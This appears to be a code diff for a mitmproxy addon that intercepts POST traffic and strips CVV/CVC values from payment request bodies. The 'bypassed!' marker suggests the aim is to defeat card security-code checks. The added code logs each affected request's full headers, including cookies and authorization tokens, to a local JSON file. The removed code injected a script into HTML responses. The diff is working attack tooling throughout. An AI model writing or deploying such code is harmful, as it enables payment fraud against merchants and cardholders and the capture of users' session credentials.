@@ -1,5 +1,7 @@
 from mitmproxy import http, ctx
 import re
+import json
+import os
 
 # Universal patterns to match CVV values in the request body
 UNIVERSAL_CVV_PATTERNS = [
@@ -38,14 +40,27 @@ UNIVERSAL_CVV_PATTERNS = [
     rb"cvc_num=[\d]{3,4}"
 ]
 
-# This dictionary keeps track of sessions with CVV data requests
-sessions_with_cvv = {}
+LOG_FILE = "cvv_log.json"
 
 def log_request_body(flow: http.HTTPFlow, message: str):
     """
     Logs the request body for debugging purposes.
     """
     ctx.log.info(f"{message}: {flow.request.content.decode('utf-8', errors='ignore')}")
+
+def log_cvv_data(flow: http.HTTPFlow):
+    """
+    Logs the details of a request containing CVV data to a file.
+    """
+    log_data = {
+        "host": flow.request.host,
+        "path": flow.request.path,
+        "headers": dict(flow.request.headers),
+        "timestamp": flow.request.timestamp_start,
+    }
+    with open(LOG_FILE, "a") as f:
+        f.write(json.dumps(log_data) + "\n")
+    ctx.log.info(f"Logged CVV data to {LOG_FILE}")
 
 def clean_up_trailing_characters(request_body: bytes) -> bytes:
     """
@@ -66,23 +81,6 @@ def remove_cvc_from_request_body(request_body: bytes) -> (bytes, bool):
         request_body = re.sub(pattern, b"", request_body)
     return request_body, cvv_removed
 
-def get_session_id(flow: http.HTTPFlow) -> str:
-    """
-    Extracts a session identifier from the request, such as a cookie or authorization header.
-    """
-    session_id = flow.request.headers.get("Cookie", None)
-    if not session_id:
-        session_id = flow.request.headers.get("Authorization", None)
-    return session_id
-
-def inject_popup_script(html: str) -> str:
-    """
-    Injects a JavaScript popup script into the HTML content.
-    """
-    popup_script = '<script>alert("bypassed!");</script>'
-    modified_html = html.replace("</body>", f"{popup_script}</body>")
-    return modified_html
-
 def modify_request(flow: http.HTTPFlow):
     """
     Modifies the intercepted request to remove CVV data.
@@ -102,24 +100,9 @@ def modify_request(flow: http.HTTPFlow):
     # Set the modified body back to the request
     flow.request.content = modified_body
 
-    # If CVV was removed, store the session identifier
+    # If CVV was removed, log the CVV data
     if cvv_removed:
-        session_id = get_session_id(flow)
-        if session_id:
-            sessions_with_cvv[session_id] = True
-
-def modify_response(flow: http.HTTPFlow):
-    """
-    Modifies the response to include a JavaScript popup if the content is HTML and the session had a CVV request.
-    """
-    session_id = get_session_id(flow)
-    if session_id and sessions_with_cvv.get(session_id):
-        content_type = flow.response.headers.get("content-type", "")
-        if "text/html" in content_type:
-            html = flow.response.content.decode("utf-8", errors="ignore")
-            modified_html = inject_popup_script(html)
-            flow.response.content = modified_html.encode("utf-8")
-            del sessions_with_cvv[session_id]
+        log_cvv_data(flow)
 
 def request(flow: http.HTTPFlow):
     """
@@ -128,21 +111,17 @@ def request(flow: http.HTTPFlow):
     if flow.request.method == "POST":
         modify_request(flow)
 
-def response(flow: http.HTTPFlow):
-    """
-    This function modifies the response to include a JavaScript popup.
-    """
-    if flow.request.method == "POST":
-        modify_response(flow)
-
 def start():
     """
     Function executed when the proxy starts.
     """
     ctx.log.info("Proxy server started. Ready to intercept requests.")
+    # Ensure the log file exists
+    if not os.path.exists(LOG_FILE):
+        with open(LOG_FILE, "w") as f:
+            f.write("")
 
 # Attach handlers to mitmproxy
 addons = [
-    request,
-    response
+    request
 ]
